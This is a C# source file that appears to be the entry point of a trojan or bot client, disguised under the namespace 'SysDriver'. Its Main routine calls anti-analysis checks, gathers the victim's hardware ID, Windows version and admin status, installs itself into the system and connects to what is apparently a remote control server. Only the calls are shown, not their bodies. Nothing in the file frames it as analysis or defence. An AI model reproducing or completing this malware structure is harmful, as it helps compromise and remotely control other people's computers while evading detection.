using System;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    static class cMain
    {
        public static cConfig ConfigClass = new cConfig();
        public static cFunctions FunctionClass = new cFunctions();
        public static cSystemInfo SystemInfoClass = new cSystemInfo();
        public static cSystem SystemClass = new cSystem();

        private static cAntis AntiClass = new cAntis();
        private static cControl ControlClass = new cControl();
        
        [STAThread]
        static void Main()
        {
            AntiClass.checkAntis();

            ConfigClass.sHWID = SystemInfoClass.getUniqueID();
            ConfigClass.sWinVersion = SystemInfoClass.getSystemVersion();
            ConfigClass.bAdminStatus = FunctionClass.getAdminStatus();

            SystemClass.loadSystem();
            FunctionClass.FlushMemory();
            ControlClass.ConnectControl();
        }
    }
}
